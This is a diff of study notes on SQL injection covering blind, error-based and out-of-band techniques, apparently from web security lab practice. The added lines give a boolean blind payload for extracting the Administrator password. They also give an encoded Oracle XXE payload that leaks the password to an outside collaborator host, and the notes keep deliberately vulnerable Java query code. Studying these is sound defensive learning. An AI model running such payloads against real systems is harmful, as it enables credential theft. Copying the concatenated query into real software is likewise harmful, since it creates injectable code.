@@ -33,9 +33,14 @@
   - Use `UNION SELECT` payloads to test for string-type columns.
 
 ## Blind SQLI
-- Occurs when the application is vulnerable to SQLI but the HTTP response does not contain the query result.
-- Allows attackers to infer information based on differing server responses.
-- Ineffective with UNION attacks.
+- Cookie TrackingID header in application uses SQL query to trace user data analytics.
+- Example query of Cookie TrackingID:
+  - `SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'`
+- It can be exploited through blind SQLI vulnerability.
+  - eg of exploit: `xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm`
+  - It forces a true condition and return password where first character is greater than m.
+- Possible attacks:use Boolean to determine the true false of the criteria, eg: if the password length is more than x, starts with what alphabet.
+- Then brute force base on response to get credentials.
 
 ## Error-Based SQLI
 - Utilizes errors to extract or infer sensitive data.
@@ -65,6 +70,8 @@
   - `'; exec master..xp_dirtree '//0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net/a'—` (DNS lookup on a specific domain)
   - Using UNION and XXE for DNS lookups on collaborator subdomains.
   - SQLI in OAST to leak data, with the leaked data being part of the subdomain name.
+  - eg: `'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.upneavivflfs9z2xmz65vswzbqhi59ty.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual—`
+  - Output: p4ssw0rd.upneavivflfs9z2xmz65vswzbqhi59ty.oastify.com
 
 ## Bypassing SQLI Filters
 - Using the hackvector extension in Burp Suite to encode payloads for XML WAP bypass.
@@ -80,8 +87,8 @@
 - Highlights the importance of not allowing user input to interfere with the SQL query structure.
 - Emphasizes best practices like input whitelisting, logical separation, and constant hard-coding.
 - The following code is vulnerable to SQLI due to direct execution of user input by having it directly concatenated into the query
-  - String query = "SELECT * FROM products WHERE category = '"+ input + "'";
-  - Statement statement = connection.createStatement();
-  - ResultSet resultSet = statement.executeQuery(query);
+  - `String query = "SELECT * FROM products WHERE category = '"+ input + "'";`
+  - `Statement statement = connection.createStatement();`
+  - `ResultSet resultSet = statement.executeQuery(query);`
 
 
